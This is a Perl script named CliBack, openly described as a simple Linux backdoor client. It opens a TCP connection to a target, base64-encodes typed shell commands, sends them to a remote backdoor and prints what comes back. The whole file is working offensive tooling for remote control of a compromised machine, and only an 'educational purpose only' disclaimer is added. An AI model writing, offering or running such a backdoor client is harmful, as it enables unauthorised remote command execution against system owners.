#!/bin/perl
# perl version : 5.30
# Description : This is a simple backdoor linux
package CliBack;

use Getopt::Long;
use IO::Socket::INET;
use MIME::Base64;

Getopt::Long::Configure('bundling');

my $helpText = "
Description : This is a simple client for backdoor

Usage : \n
--target   | -t\t: target to use
--password | -p\t: password to use
--port     |   \t: port to use (default port : 8888)
--help     | -h\t: print this help
--verbose  | -v\t: print more verbose

(This tool is for educational purpose only)

\n\nExample :

perl CliBack.pl -t 192.168.1.1 --port 8888
";

my $versionText = "
Author \t: \@Exo-poulpe
Version \t: 0.1.0.0

This tool is for educational purpose only, usage of PerlForing for attacking targets without prior mutual consent is illegal.
Developers assume no liability and are not responsible for any misuse or damage cause by this program.

";

my $help;
my $version;
my $verbose;
my $port = 8888;
my $password;
my $target;
my $soc;

GetOptions(
    'password|p=s' => \$password,    # string
    'target|t=s'   => \$target,      # string
    'port=i'       => \$port,        # int
    'version'      => \$version,     # flag
    'verbose|v'    => \$verbose,     # flag
    'help|h|?'     => \$help,        # flag
) or die($helpText);


    $SIG{INT} = sub {
        print("Ctrl + C detected\n\$ "); 
    };

sub main()
{
    if ( defined $help )
    {
        print($helpText);
    }
    elsif ( defined $port )
    {

        # flush after every write
        $| = 1;

        $soc = new IO::Socket::INET(
            PeerHost => $target,
            PeerPort => $port,
            Proto    => 'tcp',
        ) or die "ERROR in Socket Creation : $!\n";

        if ( defined $verbose )
        {
            print "TCP Connection Success.\n";
        }
        my $line;
        my $crypted;
        my $data;
        while (1)
        {
            print("\n",'$ ');
            $line = <STDIN>;
            if($line eq "exit\n")
            {
                print($line . "\n");
                $crypted = encode_base64($line);
                $soc->send($crypted);
                exit(0);
            }
            if ( defined $verbose ) { print("Debug : $line\n"); }
            $crypted = encode_base64($line);
            $soc->send($crypted);
            while(($data = <$soc>) !~ /\0\n/)
            {
                print($data);
            }
        }
        $soc->close();
    }
    else
    {
        print($helpText);
    }
}

main();
